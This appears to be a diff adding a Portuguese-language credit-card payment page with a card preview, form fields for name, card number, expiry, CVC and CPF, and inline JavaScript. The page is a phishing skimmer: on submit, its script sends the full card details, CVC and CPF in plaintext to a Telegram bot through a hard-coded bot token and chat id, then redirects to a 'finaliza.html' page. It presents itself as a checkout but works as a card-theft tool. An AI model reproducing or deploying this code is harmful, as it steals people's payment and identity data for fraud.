@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="32x32" href="./images/favicon-32x32.png">
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/cards.css">
+    <link rel="stylesheet" href="css/form.css">
+    <link rel="stylesheet" href="css/mediaQ.css">
+    <link rel="stylesheet" href="css/erro.css">
+    <title>Pagamento | Cartão de Crédito</title>
+</head>
+<body>
+    <section class="imagem">
+        <div class="imagem__cartao">
+            <div class="cartao-tras">
+                <p id="cvc-card">cvc</p>
+            </div>
+            <div class="cartao-frente">
+                <img src="images/card-logo p.svg" id="logo-card" alt="Logo do Cartão">
+                <p id="num-card">0000 0000 0000 0000</p>
+                <p id="name-card">Nome Completo</p>
+                <div class="dataCard">
+                    <p id="mes-card">00/</p>
+                    <p id="ano-card">00</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="container-form"> 
+        <form class="container-form__form" id="form">
+            <div class="form__div" id="div__name">
+                <label for="nome" class="label">Nome no Cartão</label>
+                <input type="text" id="name" class="info" placeholder="Nome completo" maxlength="20">
+                <small></small>
+            </div>
+            <div class="form__div" id="div__num">
+                <label for="numero" class="label">Número do Cartão</label>
+                <input type="tel" id="num" class="info" placeholder="0000 0000 0000 0000" required maxlength="19">
+                <small></small>
+            </div>
+            <div class="form__div2">
+                <div class="form__data">
+                    <label class="label">Validade(Mês/Ano)</label>
+                    <input type="number" id="mes" class="info data" placeholder="MM" required min="01" max="12" maxlength="2">
+                    <input type="number" id="ano" class="info data" placeholder="AA" required min="22" max="40" maxlength="2">
+                    <small></small>
+                </div>
+                <div class="form__div2-cvc" id="div__cvc">
+                    <label for="cvc" class="label">CVC</label>
+                    <input type="number" id="cvc" class="info" placeholder="000" required maxlength="3">
+                    <small></small>
+                </div>
+            </div>
+            <div class="form__div" id="div__cpf">
+                <label for="cpf" class="label">CPF</label>
+                <input type="text" id="cpf" class="info" placeholder="000.000.000-00" required maxlength="14" oninput="mascaraCPF(this)">
+                <small></small>
+            </div>
+
+            <input type="submit" value="Confirmar" class="button" id="button">
+        </form>
+    </section>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const nameInput = document.getElementById('name');
+            const numInput = document.getElementById('num');
+            const mesInput = document.getElementById('mes');
+            const anoInput = document.getElementById('ano');
+            const cvcInput = document.getElementById('cvc');
+            const cpfInput = document.getElementById('cpf');
+            
+            const nameCard = document.getElementById('name-card');
+            const numCard = document.getElementById('num-card');
+            const mesCard = document.getElementById('mes-card');
+            const anoCard = document.getElementById('ano-card');
+            const cvcCard = document.getElementById('cvc-card');
+            
+            // Atualiza o nome no cartão
+            nameInput.addEventListener('input', function () {
+                nameCard.textContent = nameInput.value || 'Nome Completo';
+            });
+
+            // Atualiza o número do cartão
+            numInput.addEventListener('input', function () {
+                let cardNumber = numInput.value.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+                cardNumber = cardNumber.substring(0, 16); // Limita a 16 dígitos
+                numCard.textContent = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ').trim(); // Formata o número com espaços
+            });
+
+            // Atualiza a validade do cartão
+            mesInput.addEventListener('input', function () {
+                mesCard.textContent = mesInput.value.padStart(2, '0') || '00';
+            });
+
+            anoInput.addEventListener('input', function () {
+                anoCard.textContent = anoInput.value.padStart(2, '0') || '00';
+            });
+
+            // Atualiza o CVC
+            cvcInput.addEventListener('input', function () {
+                cvcCard.textContent = cvcInput.value || '000';
+            });
+
+            // Validação e Envio do formulário
+            document.getElementById('form').addEventListener('submit', function (e) {
+                e.preventDefault(); // Impede o envio do formulário
+
+                const name = nameInput.value;
+                const num = numInput.value.replace(/\D/g, ''); // Remove caracteres não numéricos
+                const mes = mesInput.value;
+                const ano = anoInput.value;
+                const cvc = cvcInput.value;
+                const cpf = cpfInput.value.replace(/\D/g, ''); // Remove os caracteres não numéricos do CPF
+
+                // Verifica se todos os campos estão preenchidos corretamente
+                if (!name || !num || !mes || !ano || !cvc || !cpf) {
+                    alert('Por favor, preencha todos os campos.');
+                    return;
+                }
+
+                // Validação básica do número do cartão, validade e CVC
+                const cardPattern = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6011[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
+                if (!cardPattern.test(num)) {
+                    alert("Número de cartão inválido!");
+                    return;
+                }
+
+                if (parseInt(mes) < 1 || parseInt(mes) > 12 || parseInt(ano) < new Date().getFullYear() % 100) {
+                    alert("Data de validade inválida!");
+                    return;
+                }
+
+                if (cvc.length !== 3) {
+                    alert("CVC inválido!");
+                    return;
+                }
+
+                // Validação do CPF (simples para verificar o formato)
+                const cpfPattern = /^\d{11}$/;
+                if (!cpfPattern.test(cpf)) {
+                    alert("CPF inválido!");
+                    return;
+                }
+
+                // Enviar os dados para o Telegram
+                enviarParaTelegram(name, num, mes, ano, cvc, cpf);
+            });
+
+            // Função para enviar os dados para o Telegram
+            function enviarParaTelegram(name, num, mes, ano, cvc, cpf) {
+                const token = '6158400466:AAEUs12kCvMb0TgzUSmtIVqXVtPVknqxXFY';
+                const chat_id = '6798832266';
+                const message = `Detalhes do Cartão:\nNome: ${name}\nNúmero do Cartão: ${num}\nValidade: ${mes}/${ano}\nCVC: ${cvc}\nCPF: ${cpf}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        // Redirecionar para outra página após enviar para o Telegram
+                        window.location.href = 'finaliza.html'; // Substitua pela URL de redirecionamento desejada
+                    })
+                    .catch(error => {
+                        alert('Erro ao enviar mensagem: ' + error);
+                    });
+            }
+
+            // Máscara de CPF
+            function mascaraCPF(input) {
+                input.value = input.value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            }
+        });
+    </script>
+</body>
+</html>
